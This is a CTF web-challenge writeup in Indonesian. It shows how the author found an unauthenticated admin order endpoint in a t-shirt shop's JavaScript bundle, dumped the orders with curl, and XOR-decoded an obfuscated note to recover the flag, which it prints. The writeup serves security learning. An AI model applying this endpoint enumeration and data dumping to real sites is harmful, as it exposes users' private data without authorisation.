# KOON 7R — Web CTF Writeup

- **Challenge:** KOON 7R
- **Category:** Web
- **Flag:** `KaliTeam{test_fallback_flag_2026}`

---

# Deskripsi Challenge

Challenge menampilkan sebuah website toko kaos bertema Palestina. Deskripsi challenge mengarahkan peserta untuk melakukan bypass terhadap mekanisme keamanan aplikasi dan menemukan flag yang disembunyikan.

> *Show your support for Palestine in style! Check out our t-shirt shop and see if you can bypass our security to find the hidden flag inside.*

---

# Ringkasan Temuan

Aplikasi menggunakan:

- **Frontend:** React + Vite
- **Backend:** Express + tRPC

Halaman seperti `/admin` ternyata hanya mengembalikan file `index.html`, sehingga proses routing dilakukan sepenuhnya di sisi frontend.

Dari hasil analisis JavaScript frontend ditemukan endpoint:

```
/api/trpc/admin.getOrders
```

Endpoint tersebut dapat diakses tanpa autentikasi dan mengembalikan seluruh data order.

Salah satu order memiliki field `notes` berisi string berikut:

```
ENC_REF: UhBTVEYCWlxGQF9bU1dEAVISVlhTRkNaWVFTFFNTRlBaBkUXX1xTV0RWUxJUClNFQgpYVFBFUANDU19VQEZaWFIC
```

Data tersebut merupakan:

1. Base64
2. Di-XOR menggunakan key `freepalestine`
3. Hasil XOR berupa string hexadecimal
4. Decode hex menghasilkan flag.

---

# Tools

- curl
- grep
- python3
- Browser DevTools / Terminal

---

# Step 1 — Recon Halaman Utama

Ambil halaman utama dan identifikasi asset JavaScript.

```bash
export BASE='http://4404.chall.kali-team.online:8001'

mkdir -p Koon7R
cd Koon7R

curl -sS "$BASE/" -o index.html

grep -oE '/assets/[^"]+' index.html
```

Output:

```
/assets/index-DysfXZA_.js
/assets/index-CkoPDxFw.css
```

Terlihat bahwa seluruh logic aplikasi berada pada file JavaScript utama.

---

# Step 2 — Download dan Analisis JavaScript

Download file JavaScript.

```bash
JS=$(grep -oE '/assets/index-[^"]+\.js' index.html | head -1)

echo "$JS"

curl -sS "$BASE$JS" -o app.js

ls -lh app.js
```

Cari endpoint penting di dalam JavaScript.

```bash
python3 - <<'PY'
import re

s=open('app.js','r',errors='ignore').read()

patterns={
    "api":r'/api/[A-Za-z0-9_./:-]+',
    "admin":r'/admin[A-Za-z0-9_./:-]*',
    "flag":r'(?:flag|KALI|CTF)\{[^}]{1,120}\}',
    "flag_paths":r'[A-Za-z0-9_./-]*flag[A-Za-z0-9_./-]*'
}

for name,pat in patterns.items():
    print(f"\n### {name}")
    for x in sorted(set(re.findall(pat,s,flags=re.I)))[:60]:
        print(x)
PY
```

Hasil penting:

```
/api/oauth/callback
/api/trpc
/api/trpc/admin.getOrders
/admin/login
```

Endpoint yang paling menarik adalah:

```
/api/trpc/admin.getOrders
```

---

# Step 3 — Analisis Logic Track Order

Dari hasil pembacaan JavaScript frontend ditemukan bahwa fitur **Track Order** melakukan request langsung ke endpoint admin.

```javascript
fetch("/api/trpc/admin.getOrders")
```

Hal ini menunjukkan bahwa endpoint admin dapat diakses oleh pengguna publik tanpa proses autentikasi.

---

# Step 4 — Dump Data Order

Akses endpoint tersebut secara langsung.

```bash
curl -sS "$BASE/api/trpc/admin.getOrders" -o orders.json

file orders.json

head -c 300 orders.json
echo
```

Response berupa JSON.

Contoh:

```json
{
  "result": {
    "data": {
      "json": {
        "success": true,
        "orders": [
          {
            "id": "KOON7R-BEQ69-OMARGHANEM",
            ...
          }
        ]
      }
    }
  }
}
```

Tampilkan field penting setiap order.

```bash
python3 - <<'PY'
import json

d=json.load(open('orders.json'))
orders=d["result"]["data"]["json"]["orders"]

for o in orders:
    print("\nID:",o["id"])
    print("STATUS:",o.get("status"))
    print("TOTAL:",o.get("totalAmount"))
    print("NOTES:",repr(o.get("notes")))
PY
```

Output penting:

```
ID: KOON7R-5UTHN-OMARAL-KHATIB
STATUS: pending
TOTAL: 735

NOTES:
ENC_REF: UhBTVEYCWlxGQF9bU1dEAVISVlhTRkNaWVFTFFNTRlBaBkUXX1xTV0RWUxJUClNFQgpYVFBFUANDU19VQEZaWFIC
```

Field `notes` terlihat menyimpan data yang dienkripsi.

---

# Step 5 — Decode ENC_REF

String setelah `ENC_REF:` merupakan Base64.

Setelah dilakukan Base64 decode, hasilnya belum dapat dibaca sehingga dicoba dilakukan XOR menggunakan key yang relevan dengan tema challenge:

```
freepalestine
```

Script berikut melakukan proses decoding secara otomatis.

```bash
python3 - <<'PY'
import json
import re
import base64

d=json.load(open("orders.json"))
orders=d["result"]["data"]["json"]["orders"]

enc=None

for o in orders:
    note=o.get("notes","")
    m=re.search(r'ENC_REF:\s*([A-Za-z0-9+/=]+)', note)
    if m:
        enc=m.group(1)
        break

raw=base64.b64decode(enc)

key=b"freepalestine"

xored=bytes(
    b ^ key[i % len(key)]
    for i,b in enumerate(raw)
)

print("XOR result:",xored.decode())

flag=bytes.fromhex(xored.decode()).decode()

print("FLAG:",flag)
PY
```

Output:

```
XOR result:
4b616c695465616d7b746573745f66616c6c6261636b5f666c61675f323032367d

FLAG:
KaliTeam{test_fallback_flag_2026}
```

---

# Analisis Kerentanan

Kerentanan utama berasal dari endpoint administrator yang dapat diakses tanpa autentikasi.

```
/api/trpc/admin.getOrders
```

Endpoint tersebut mengembalikan seluruh data order, termasuk field internal `notes` yang berisi referensi terenkripsi (`ENC_REF`).

Walaupun data telah diobfuscasi menggunakan Base64 dan XOR, mekanisme tersebut tidak memberikan perlindungan yang memadai karena key dapat ditebak berdasarkan konteks challenge.

Secara keseluruhan alur eksploitasi adalah:

1. Enumerasi asset JavaScript.
2. Menemukan endpoint `admin.getOrders`.
3. Mengakses endpoint tanpa login.
4. Mengambil nilai `ENC_REF`.
5. Base64 decode.
6. XOR menggunakan key `freepalestine`.
7. Decode hexadecimal menjadi flag.

---

# Flag

```text
KaliTeam{test_fallback_flag_2026}
```
